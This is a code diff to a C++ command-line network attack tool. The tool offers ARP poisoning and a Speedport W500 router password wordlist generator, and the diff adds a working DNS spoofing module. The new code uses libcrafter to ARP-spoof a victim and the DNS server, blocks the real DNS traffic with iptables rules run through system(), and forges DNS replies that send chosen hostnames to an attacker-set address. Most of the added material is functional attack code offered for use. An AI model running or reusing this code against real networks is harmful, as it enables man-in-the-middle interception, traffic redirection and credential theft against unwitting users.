@@ -1,12 +1,18 @@
-/* ================================
+/* ================================================
  * Maintainer: Deltax
  * Date: 2017-11-11
- * Purpose: Source file
- * ================================
+ * Purpose: Main file
+ *
+ * Changelog:
+ * V1: - fix bad code
+ *     - update types
+ *     - add dnsspoofer
+ * ================================================
  */
 
+// Optimized libaries
 #include <iostream>
-#include <cstring>
+#include <string>
 #include <vector>
 #include <fstream>
 #include <boost/tokenizer.hpp>
@@ -15,130 +21,152 @@
 #include <arpa/inet.h>
 #include <netinet/ether.h>
 #include <pcap.h>
+#include <crafter.h>
+#include <signal.h>
+#include <map>
+
+// Custom libaries
 #include "color.h"
 
+
+using namespace std;
+using namespace Crafter;
+using namespace boost;
+
+/*
+ * ================================================
+ * Main Help file
+ * Print all arguement and is the help desk
+ * ================================================
+ */
 void help() {
-    std::cout << "\033[2J\033[1;1H"
-              << "------------- < Friendly > --------------\n"
-              << BOLD << "\nMisc\n" << RESET
-              << "Help \033[31m:\033[0m\t\t\t help \n"
-              << "Quit \033[31m:\033[0m\t\t\t quit\n"
+    cout << "\033[2J\033[1;1H"
+         << "------------- < Friendly > --------------\n"
+         << BOLD << "\nMisc\n" << RESET
+         << "Help \033[31m:\033[0m\t\t\t help \n"
+         << "Quit \033[31m:\033[0m\t\t\t quit\n"
 
-              << BOLD << "\nSet options\n" << RESET
-              << "Set ssid \033[31m:\033[0m\t\t set_ssid\n"
-              << "Set bssid \033[31m:\033[0m\t\t set_bssid\n"
-              << "Set channel \033[31m:\033[0m\t\t set_channel\n"
-              << "Set Gateway \033[31m:\033[0m\t\t set_gateway_ip\n"
-              << "Set Target IP \033[31m:\033[0m\t\t set_target_ip\n"
-              << "Set interface  \033[31m:\033[0m\t set_interface\n"
+         << BOLD << "\nSet options\n" << RESET
+         << "Set ssid \033[31m:\033[0m\t\t set_ssid\n"
+         << "Set bssid \033[31m:\033[0m\t\t set_bssid\n"
+         << "Set channel \033[31m:\033[0m\t\t set_channel\n"
+         << "Set Gateway \033[31m:\033[0m\t\t set_gateway_ip\n"
+         << "Set Target IP \033[31m:\033[0m\t\t set_target_ip\n"
+         << "Set interface  \033[31m:\033[0m\t set_interface\n"
 
-              << BOLD << "\nShow commands\n" << RESET
-              << "Show Modules \033[31m:\033[0m\t\t show_modules\n"
-              << "Show Settings \033[31m:\033[0m\t\t show_settings\n"
-              << "Show Help \033[31m:\033[0m\t\t show_help\n"
+         << BOLD << "\nShow commands\n" << RESET
+         << "Show Modules \033[31m:\033[0m\t\t show_modules\n"
+         << "Show Settings \033[31m:\033[0m\t\t show_settings\n"
+         << "Show Help \033[31m:\033[0m\t\t show_help\n"
 
-              << BOLD << "\nAttack modules\n" << RESET
-              << "Arp poisoning \033[31m:\033[0m\t\t arp_poison\n"
-              << "Generate wordlist \033[31m:\033[0m\t gen_speedport_w500\n"
-              << "---------------- < MAN > ----------------\n\n"
-              << BOLD << "\nMisc\n" << RESET
-              << GREEN << "Help: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " show_help:\n"
-              << "\t[" << GREEN << "+" << RESET "]"
-              << " help:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Print the help manual \n\n"
+         << BOLD << "\nAttack modules\n" << RESET
+         << "Arp poisoning \033[31m:\033[0m\t\t arp_poison\n"
+         << "Generate wordlist \033[31m:\033[0m\t gen_speedport_w500\n"
+         << "---------------- < MAN > ----------------\n\n"
+         << BOLD << "\nMisc\n" << RESET
+         << GREEN << "Help: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " show_help:\n"
+         << "\t[" << GREEN << "+" << RESET "]"
+         << " help:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Print the help manual \n\n"
 
-              << GREEN << "Quit: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " quit:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Quit with 0 \n\n"
+         << GREEN << "Quit: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " quit:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Quit with 0 \n\n"
 
-              << BOLD << "\n\nSet options\n" << RESET
-              << GREEN << "set_ssid: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_ssid [string]:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set ssid \n\n"
+         << BOLD << "\n\nSet options\n" << RESET
+         << GREEN << "set_ssid: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_ssid [string]:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set ssid \n\n"
 
-              << GREEN << "set_bssid: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_bssid [string]:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set bssid \n\n"
+         << GREEN << "set_bssid: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_bssid [string]:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set bssid \n\n"
 
-              << GREEN << "set_channel: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_channel [int]:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set channel \n\n"
+         << GREEN << "set_channel: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_channel [int]:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set channel \n\n"
 
-              << GREEN << "set_gateway_ip: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_gateway_ip [string:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set channel \n\n"
+         << GREEN << "set_gateway_ip: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_gateway_ip [string:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set channel \n\n"
 
-              << GREEN << "set_target_ip: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_target_ip [int]:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set target ip for arp poisoning \n\n"
+         << GREEN << "set_target_ip: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_target_ip [int]:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set target ip for arp poisoning \n\n"
 
-              << GREEN << "set_gateway_ip: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " set_gateway_ip [int]:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << "Set gateway ip for arp poisoning \n\n"
+         << GREEN << "set_gateway_ip: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " set_gateway_ip [int]:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << "Set gateway ip for arp poisoning \n\n"
 
-              << BOLD << "\n\nShow options\n" << RESET << GREEN << "List Modules: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " show_modules:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Print all modules \n\n"
+         << BOLD << "\n\nShow options\n" << RESET << GREEN << "List Modules: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " show_modules:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Print all modules \n\n"
 
-              << GREEN << "Show help: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " show_help:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Print the help manual \n\n"
+         << GREEN << "Show help: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " show_help:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Print the help manual \n\n"
 
-              << GREEN << "Show settings: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " show_settings:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Print all settings which are in use \n\n"
+         << GREEN << "Show settings: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " show_settings:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Print all settings which are in use \n\n"
 
-              << BOLD << "\n\nAttack options\n" << RESET
-              << GREEN << "Arp poisoning: \n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " arp_poison:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Arp_poison clients in a network \n\n"
+         << BOLD << "\n\nAttack options\n" << RESET
+         << GREEN << "Arp poisoning: \n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " arp_poison:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Arp_poison clients in a network \n\n"
 
-              << GREEN << "Generate wordlists: \n"
-              << RESET << "\t[" << GREEN << "+" << RESET "]"
-              << " gen_speedport_w500:\n\n"
-              << RED << " ~ " << RESET << BOLD << "Description:\n"
-              << RESET << " Generate speed port wordlist for the speedsport w500 \n\n"
-              << "---------------- < MAN > ----------------\n\n";
+         << GREEN << "Generate wordlists: \n"
+         << RESET << "\t[" << GREEN << "+" << RESET "]"
+         << " gen_speedport_w500:\n\n"
+         << RED << " ~ " << RESET << BOLD << "Description:\n"
+         << RESET << " Generate speed port wordlist for the speedsport w500 \n\n"
+         << "---------------- < MAN > ----------------\n\n";
 }
 
+/*
+ * ================================================
+ *  ARP Spoofing main
+ * ================================================
+ */
+
 void arp_main(const char *interface, const char *target_ip, const char *gateway_ip) {
-    using namespace std;
+    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
     pcap_t *handle;
     char *dev;
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -183,9 +211,9 @@ void arp_main(const char *interface, const char *target_ip, const char *gateway_
          << "\n"
          << RESET << RED << " ~ " << RESET << BOLD << "Mac: " << RESET << senderMAC
          << RESET << RESET << RED << " ~ " << RESET << BOLD
-         << "Gateway IP: " << RESET << gateway_ip << std::endl
+         << "Gateway IP: " << RESET << gateway_ip << endl
          << RESET << RESET << RED << " ~ " << RESET << BOLD
-         << "Device: " << RESET << interface << std::endl;
+         << "Device: " << RESET << interface << endl;
 
     dev = pcap_lookupdev(errbuf);
     if (dev == nullptr) {
@@ -240,7 +268,7 @@ void arp_main(const char *interface, const char *target_ip, const char *gateway_
 
         strftime(timestr, sizeof timestr, "%H:%M:%S", ltime);
         cout << RESET << "[" << GREEN << "I" << RESET << "] " << "Header " << BLUE << header->ts.tv_usec << RESET
-             << " Lenght: " << RED << header->len << RESET << std::endl;
+             << " Lenght: " << RED << header->len << RESET << endl;
 
         eth = (struct ether_header *) pkt;
         arp = (struct ether_arp *) (pkt + ETH_HLEN);
@@ -268,16 +296,20 @@ void arp_main(const char *interface, const char *target_ip, const char *gateway_
     ether_aton_r(targetMAC, (struct ether_addr *) arp->arp_tha);
     inet_pton(AF_INET, target_ip, arp->arp_tpa);
 
-
+    // Send packets
     pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1 ? cout << RESET << "\n[" << RED << "-" << RESET << "]"
                                                                      << " Well we have a problem\n"
-                                                              :      cout << RESET << "\n[" << GREEN << "+" << RESET << "]"
+                                                              : cout << RESET << "\n[" << GREEN << "+" << RESET << "]"
                                                                      << " Spoofing sucessfull\n";
+    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
+
 
 }
 
-void show_settings(const std::string &bssid, std::string ssid, const std::string channel, const std::string &interface);
+// Display settings
+void show_settings(const string &bssid, string ssid, const string channel, const string &interface);
 
+// Main completion function
 static char **completion(const char *, int);
 
 char *generate(const char *, int);
@@ -286,6 +318,7 @@ char *dupstr(char *);
 
 void *xmalloc(int);
 
+// Here are stored all custom commands for completion
 const char *cmd[] = {
         "show_modules",
         "show_help",
@@ -304,7 +337,7 @@ const char *cmd[] = {
         "quit",
         0};
 
-
+// Def readline size
 void *xmalloc(int size) {
     void *buffer;
 
@@ -359,20 +392,20 @@ void *xmalloc(size_t size) {
     return buffer;
 }
 
-void show_settings(const std::string &bssid, std::string ssid, const std::string channel, const std::string &interface);
+void show_settings(const string &bssid, string ssid, const string channel, const string &interface);
 
 void
-show_settings(const std::string &bssid, std::string ssid, const std::string channel, const std::string &interface) {
-    std::cout << GREEN << "Settings: \n"
-              << RESET << RED << " ~ " << RESET << BOLD << "BSSID: " << bssid
-              << "\n"
-              << RESET << RESET << RED << " ~ " << RESET << BOLD
-              << "SSID: " << ssid << std::endl
-              << RESET << RESET << RED << " ~ " << RESET << BOLD
-              << "CHANNEL: " << channel << std::endl
-              << RESET << RESET << RED << " ~ " << RESET << BOLD
-              << "INTERFACE: " << interface << std::endl
-              << RESET;
+show_settings(const string &bssid, string ssid, const string channel, const string &interface) {
+    cout << GREEN << "Settings: \n"
+         << RESET << RED << " ~ " << RESET << BOLD << "BSSID: " << bssid
+         << "\n"
+         << RESET << RESET << RED << " ~ " << RESET << BOLD
+         << "SSID: " << ssid << endl
+         << RESET << RESET << RED << " ~ " << RESET << BOLD
+         << "CHANNEL: " << channel << endl
+         << RESET << RESET << RED << " ~ " << RESET << BOLD
+         << "INTERFACE: " << interface << endl
+         << RESET;
 }
 
 char **completion(const char *text, int start, int end) {
@@ -389,20 +422,29 @@ char **completion(const char *text, int start, int end) {
 
 }
 
+// print modules may helpfull for the future
 void show_modules() {
-    std::cout << GREEN << BOLD << "Modules:\n" << RESET
-              << "[Arp spoofing]" << GREEN << "... working\n" << RESET
-              << "[Gen wordlist]" << GREEN << "... working\n" << RESET;
+    cout << GREEN << BOLD << "Modules:\n" << RESET
+         << "[Arp spoofing]" << GREEN << "... working\n" << RESET
+         << "[Gen wordlist]" << GREEN << "... working\n" << RESET;
 }
 
+// Just to make the code not ugly
 int convert2ascii(char c) {
     int a = c;
     return a;
 }
 
-void gen_speedport_w500(std::string ssid, std::string bssid) {
-    std::string temp;
-    std::ofstream a;
+/*
+ * ================================================
+ * Generate Wordlist
+ * Vendor: w500
+ * ================================================
+ */
+
+void gen_speedport_w500(string ssid, string bssid) {
+    string temp;
+    ofstream a;
     a.open("../wordlist/speedport-w500.txt");
     for (int i = 9; i <= 12; i++) {
         temp += bssid[i];
@@ -419,17 +461,256 @@ void gen_speedport_w500(std::string ssid, std::string bssid) {
     a.close();
 }
 
+/*
+ * ================================================
+ * DNS Spoof Module
+ * ================================================
+ */
+struct HostInfo {
+    string iface;
+    string dns_ip;
+    string victim_ip;
+    string dns_mac;
+    string victim_mac;
+    string my_mac;
+};
+
+map <string, string> spoof_list;
+
+void DNSSpoofer(Packet *sniff_packet, void *user);
+
+void iptables_block(const string &iface, const string &victim_ip, int dst_port);
+
+void iptables_flush(const string &iface, const string &victim_ip, int dst_port);
+
+// Global pointer to Sniffer
+Sniffer *sniff;
+
+// Catch control C
+void ctrl_c(int d) {
+    /* Cancel the sniffing thread */
+    sniff->Cancel();
+}
+
+void DNSSpoofer(Packet *sniff_packet, void *user) {
+    using namespace std;
+    using namespace Crafter;
+
+    /* Cast the MAC addresses structure */
+    HostInfo *host_data = static_cast<HostInfo *>(user);
+
+    /* Get the Ethernet Layer */
+    Ethernet *ether_layer = GetEthernet(*sniff_packet);
+
+    /* Get the IP layer */
+    IP *ip_layer = GetIP(*sniff_packet);
+
+    /* Get the UDP layer */
+    UDP *udp_layer = GetUDP(*sniff_packet);
+
+    /* Flag to set when we should spoof a DNS answer */
+    int spoof = 0;
+
+    /* Checks if the source MAC is not mine */
+    if (ether_layer->GetSourceMAC() != host_data->my_mac) {
+
+        /* Checks if the packet is coming from the victim... */
+        if (ip_layer->GetSourceIP() == host_data->victim_ip) {
+
+            /* Get the RawLayer */
+            RawLayer *raw_layer = GetRawLayer(*sniff_packet);
+
+            /* Create a DNS header */
+            DNS dns_req;
+            /* And decode it from a raw layer */
+            dns_req.FromRaw(*raw_layer);
+
+            /* Check if the DNS packet is a query and there is a question on it... */
+            if ((dns_req.GetQRFlag() == 0) && (dns_req.Queries.size() > 0)) {
+                /* Get the host name to be resolved */
+                string hostname = dns_req.Queries[0].GetName();
+
+                /* Print information */
+                cout << "[@] Query received -> Host Name = " << hostname << endl;
+
+                /* Iterate the spoof_list */
+                map<string, string>::iterator it_list;
+                for (it_list = spoof_list.begin(); it_list != spoof_list.end(); it_list++) {
+
+                    /* Get the name on the list */
+                    string code_name = (*it_list).first;
+
+                    /* Check if the code_name is inside the host name requested */
+                    if (hostname.find(code_name) != string::npos) {
+
+                        cout << "[+] ---- Spoofed request (" << code_name << ") -> Host Name = " << hostname << endl;
+
+                        /* Get the IP address associated to this code_name */
+                        string ip_address = (*it_list).second;
+                        /* Create the DNS Answer */
+                        DNS::DNSAnswer dns_answer(hostname, ip_address);
+                        /* And put it into the container */
+                        dns_req.Answers.push_back(dns_answer);
+
+                        /* Modify the original request */
+                        dns_req.SetQRFlag(1); /* Now is a response */
+                        dns_req.SetRAFlag(1); /* Recursion is available */
+
+                        /* Set the spoof flag */
+                        spoof = 1;
+                        /* Break the loop */
+                        break;
+                    }
+                }
+            }
+
+            /* Send the spoofed answer */
+            if (spoof) {
+                /* Pop the top layer... */
+                sniff_packet->PopLayer();
+                /* ... and put the DNS spoof answer just created */
+                *sniff_packet /= dns_req;
+
+                /* +++++ Ethernet Layer */
+
+                /* Send the packet to the victim */
+                ether_layer->SetDestinationMAC(host_data->victim_mac);
+                /* And put our MAC ad a source */
+                ether_layer->SetSourceMAC(host_data->my_mac);
+
+                /* Get DNS server IP address */
+                string dns_ip = ip_layer->GetDestinationIP();
+
+                /* Send the packet to the victim IP */
+                ip_layer->SetDestinationIP(host_data->victim_ip);
+                /* PUt the dns IP address as a source IP */
+                ip_layer->SetSourceIP(dns_ip);
+
+
+                /* +++++ UDP Layer */
+
+                /* Swap the destinations and source port */
+                short_word src_port = udp_layer->GetSrcPort();
+                short_word dst_port = udp_layer->GetDstPort();
+                udp_layer->SetSrcPort(dst_port);
+                udp_layer->SetDstPort(src_port);
+
+                /* After modifying the layers, write the packet on the wire */
+                sniff_packet->Send(host_data->iface);
+                //sniff_packet->HexDump();
+            } else {
+
+                /* Send the packet to the dns */
+                ether_layer->SetDestinationMAC(host_data->dns_mac);
+                /* And put our MAC ad a source */
+                ether_layer->SetSourceMAC(host_data->my_mac);
+                /* After modifying the Ethernet layer, write the packet on the wire */
+                sniff_packet->Send(host_data->iface);
+
+            }
+
+
+            /* ...or coming from the server  */
+        } else if (ip_layer->GetDestinationIP() == host_data->victim_ip) {
+
+            /* Send the packet to the victim */
+            ether_layer->SetDestinationMAC(host_data->victim_mac);
+            /* And put our MAC ad a source */
+            ether_layer->SetSourceMAC(host_data->my_mac);
+
+            /* After modifying the Ethernet layer, write the packet on the wire */
+            sniff_packet->Send(host_data->iface);
+        }
+
+    }
+
+}
+
+void iptables_block(const string &iface, const string &victim_ip, int dst_port) {
+    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
+
+    system(string("/sbin/iptables  -A FORWARD -s " + victim_ip +
+                  " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
+    system(string("/sbin/iptables -A FORWARD -d " + victim_ip +
+                  " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
+}
+
+void iptables_flush(const string &iface, const string &victim_ip, int dst_port) {
+    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
+    system(string("/sbin/iptables -D FORWARD -s " + victim_ip +
+                  " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
+    system(string("/sbin/iptables -D FORWARD -d " + victim_ip +
+                  " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
+}
+
+void dns_spoof_main(string iface, string dns_ip, string victim_ip) {
+    using namespace std;
+    using namespace Crafter;
+
+    InitCrafter();
+
+    /* Set the interface */
+
+    /* Create a structure with information about the attack */
+    HostInfo *host_info = new HostInfo;
+
+    /* IP addresses -> This is a data supply by the user */
+    short_word dst_port = 53; /* DNS traffic */
+
+    /* List of addresses -> This also is data supplied by the user */
+    spoof_list["proxy"] = "3.3.3.3";
+
+    /* Create a HostInfo structure */
+    host_info->iface = iface;
+    host_info->dns_ip = dns_ip;
+    host_info->victim_ip = victim_ip;
+    host_info->dns_mac = GetMAC(dns_ip, iface);
+    host_info->victim_mac = GetMAC(victim_ip, iface);
+    host_info->my_mac = GetMyMAC(iface);
+
+    /* Before the attack, execute the IPTABLES "script" */
+    iptables_block(iface, victim_ip, dst_port);
+
+    /* Start the ARP spoofing */
+    ARPContext *context = ARPSpoofingReply(dns_ip, victim_ip, iface);
+
+    /* Print data about the spoofing, and wait a few seconds */
+    PrintARPContext(*context);
+    sleep(3);
+
+    /* Create a sniffer	*/
+    sniff = new Sniffer("udp and host " + victim_ip + " and port " + StrPort(dst_port), iface, DNSSpoofer);
+
+    /* Now, spawn the capture */
+    void *sniffer_arg = static_cast<void *>(host_info);
+    sniff->Spawn(-1, sniffer_arg);
+
+    cout << "[@] Spawning the sniffer, redirecting the traffic... " << endl;
+
+    /* Set a signal catcher */
+    signal(SIGINT, ctrl_c);
+
+    /* And wait for the sniffer to finish (when CONTROL-C is pressed) */
+    sniff->Join();
+
+    /* Delete the IP tables rules */
+    iptables_flush(iface, victim_ip, dst_port);
+
+    /* Delete allocated data */
+    delete host_info;
+
+    /* Clean up ARP context */
+    CleanARPContext(context);
+
+    /* Clean up library stuff... */
+    CleanCrafter();
+
+}
+
 // ============================================================================================
 // Manage input
 // ============================================================================================
 void read_user_input() {
-
-    using std::cin;
-    using std::cout;
-    using std::endl;
-    using std::string;
-    using std::vector;
-    using namespace boost;
 
     // Used as a command input
     char *buffer;
@@ -482,7 +763,7 @@ void read_user_input() {
 
         // split command into the first and secound command
         boost::char_separator<char> sep(" ");
-        typedef boost::tokenizer<boost::char_separator<char> > t_tokenizer;
+        typedef boost::tokenizer <boost::char_separator<char>> t_tokenizer;
         t_tokenizer tok(command, sep);
 
         // Only print the first argument
@@ -497,6 +778,8 @@ void read_user_input() {
         // ===========================================
         // Menu
         // ===========================================
+
+        // hopefully I find a better way to parse arguments
         if (option == "help" || option == "show_help")
             help();
         else if (option == "show_modules")
@@ -517,10 +800,14 @@ void read_user_input() {
             SET.at(5) = command.erase(0, 14);
         else if (option == "set_gateway_ip")
             SET.at(6) = command.erase(0, 15);
+        else if (option == "set_dns_ip")
+            SET.at(7) = command.erase(0, 11);
         else if (option == "arp_poison")
             arp_main(SET.at(3).c_str(), SET.at(5).c_str(), SET.at(6).c_str());
         else if (option == "show_settings")
             show_settings(SET.at(0), SET.at(2), SET.at(1), SET.at(3));
+        else if (option == "dns_sppof")
+            dns_spoof_main(SET.at(3), SET.at(7), SET.at(4));
         else if (option == "clear")
             cout << "\033[2J\033[1;1H";
         else if (option == "clear_buff")
